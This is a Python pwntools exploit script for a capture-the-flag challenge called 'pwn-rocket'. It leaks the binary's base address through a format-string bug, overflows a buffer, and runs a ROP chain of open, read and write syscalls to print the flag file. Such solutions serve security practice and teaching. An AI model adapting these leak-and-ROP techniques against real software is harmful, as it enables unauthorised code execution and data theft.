from pwn import *

# leak PIE base with %p
# in command, overflow, rop to get flag

context.arch = 'amd64'
elf = ELF("./pwn-rocket")

#p = remote("0.cloud.chals.io", 13163)
p = process("./pwn-rocket")

p.recvuntil(">>>\n")

p.sendline("%6$p")

p.recvuntil("Welcome: ")

start_leak = p.recvline()[:-1]
elf.address = int(start_leak, 16) - elf.sym["_start"]

print(hex(elf.address))

# ROP Gadgets:
pop_rdi = p64(elf.address + 0x000000000000168b)
pop_rsi_r15 = p64(elf.address + 0x0000000000001689)
pop_r10 = p64(elf.address + 0x00000000000014c7)
pop_rdx = p64(elf.address + 0x00000000000014be)
bin_sh = p64(elf.address + 0x2d61)
flag_symbol = p64(elf.address + 0x2db8)
syscall = p64(elf.address + 0x00000000000014db)
pop_rax = p64(elf.address + 0x0000000000001210)
pop_r8 = p64(elf.address + 0x00000000000014d1)

p.recvuntil(" something >>>")
payload = b"A"*0x48
# do open
payload += pop_rdi + flag_symbol + pop_rsi_r15 + p64(0) + p64(0) + pop_rax + p64(2) + syscall
# do read
payload += pop_rdi + p64(3) + pop_rsi_r15 + p64(elf.bss(0x80)) + p64(0) + pop_rdx + p64(80) + pop_rax + p64(0) + syscall
# do write
payload += pop_rdi + p64(1) + pop_rsi_r15 + p64(elf.bss(0x80)) + p64(0) + pop_rdx + p64(80) + pop_rax + p64(1) + syscall

p.sendline(payload)

p.interactive()
